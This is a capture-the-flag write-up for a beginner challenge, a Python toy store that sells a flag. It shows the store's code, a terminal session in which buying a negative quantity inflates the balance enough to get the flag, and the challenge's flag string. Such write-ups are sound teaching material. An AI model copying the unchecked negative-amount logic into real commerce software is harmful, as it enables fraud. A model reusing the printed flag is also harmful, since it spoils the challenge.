# cybershopper

[library.m0unt41n.ch/challenges/cybershopper](https://library.m0unt41n.ch/challenges/cybershopper) ![](../../resources/pwn.svg) ![](../../resources/baby.svg) 

# TL;DR

We get a simple Python program that we interact with:

```python
from rich import print, rule, table
import os

BALANCE = 10
STORE = {
        "breadboard": 1,
        "esp8266": 2,
        "raspberry pi pico": 5,
        "arduino uno r4": 10,
        "raspberry pi 4": 40,
        "flag": 1337
}

def show_options():
    print(rule.Rule("Products"))
    print("You can buy the following products:")
    tbl = table.Table(show_header=True, header_style="bold magenta", title_style="bold green", width=60)
    tbl.add_column("ID", style="dim", width=12)
    tbl.add_column("Product", style="green", width=12)
    tbl.add_column("Price", justify="right", style="blue")
    for i, (product, price) in enumerate(STORE.items()):
        tbl.add_row(str(i), product, f"{price}$")
    print(tbl)

def buy_product():
    global BALANCE
    show_options()
    print(rule.Rule("Buy product"))
    print("[blue]Enter the ID of the product you want to buy:[/blue]")
    print("[green]> [/green]", end="")
    try:
        product_id = int(input())
    except ValueError:
        print("[red]Invalid product ID[/red]")
        return
    if product_id < 0 or product_id >= len(STORE):
        print("[red]Invalid product ID[/red]")
        return
    product = list(STORE.keys())[product_id]
    print(f"Product: [green]{product}[/green]")
    print(f"Price: [blue]{STORE[product]}$[/blue]")
    # amount
    print(f"Enter the amount of [green]{product}[/green] you want to buy")
    print("[green]> [/green]", end="")
    try:
        amount = int(input())
    except ValueError:
        print("Invalid amount")
        return
    total_price = STORE[product] * amount
    if total_price > BALANCE:
        print("[red]Not enough balance[/red]")
        return
    if product == "flag":
        if not BALANCE >= 31337:
            print("[yellow]You're not worthy of the flag[/yellow]")
            print("[red]Reset your balance to zero. Lol.")
            BALANCE = 0
        else:
            print(os.getenv("FLAG"))
        return
    print(f"Total price: [blue]{total_price}$[/blue]")
    BALANCE -= total_price
    print(f"[green]{amount} {product}[/green] bought successfully")

def main():
    while True:
        print(rule.Rule("Welcome to the store"))
        print(f"Your balance: [blue]{BALANCE}$[/blue]")
        print("1. Buy product")
        print("2. Exit")
        print("Enter your choice:")
        print("[green]> [/green]", end="")
        choice = input()
        if choice == "1":
            buy_product()
        elif choice == "2":
            break
        else:
            print("Invalid choice")

if __name__ == "__main__":
    main()
```

From the code, it's obvious that we just need to "buy" negative amount of goods.

```
$ export FLAG='flag{not_a_flag}'
$ python main.py 
────────────── Welcome to the store ──────────────
Your balance: 10$
1. Buy product
2. Exit
Enter your choice:
> 1
──────────────────── Products ────────────────────
You can buy the following products:
┏━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┓
┃ ID                    ┃ Product              ┃     Price ┃
┡━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━┩
│ 0                     │ breadboard           │        1$ │
│ 1                     │ esp8266              │        2$ │
│ 2                     │ raspberry pi pico    │        5$ │
│ 3                     │ arduino uno r4       │       10$ │
│ 4                     │ raspberry pi 4       │       40$ │
│ 5                     │ flag                 │     1337$ │
└───────────────────────┴──────────────────────┴───────────┘
────────────────── Buy product ───────────────────
Enter the ID of the product you want to buy:
> 4
Product: raspberry pi 4
Price: 40$
Enter the amount of raspberry pi 4 you want to buy
> -1000
Total price: -40000$
-1000 raspberry pi 4 bought successfully
────────────── Welcome to the store ──────────────
Your balance: 40010$
1. Buy product
2. Exit
Enter your choice:
> 1
──────────────────── Products ────────────────────
You can buy the following products:
┏━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┓
┃ ID                    ┃ Product              ┃     Price ┃
┡━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━┩
│ 0                     │ breadboard           │        1$ │
│ 1                     │ esp8266              │        2$ │
│ 2                     │ raspberry pi pico    │        5$ │
│ 3                     │ arduino uno r4       │       10$ │
│ 4                     │ raspberry pi 4       │       40$ │
│ 5                     │ flag                 │     1337$ │
└───────────────────────┴──────────────────────┴───────────┘
────────────────── Buy product ───────────────────
Enter the ID of the product you want to buy:
> 5
Product: flag
Price: 1337$
Enter the amount of flag you want to buy
> 1
flag{not_a_flag}
────────────── Welcome to the store ──────────────
Your balance: 40010$
1. Buy product
2. Exit
Enter your choice:
> 2

```

And all that is reproducible with the remote instance.

---

## `SCD{n3g4t1v3_4m0unt5}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
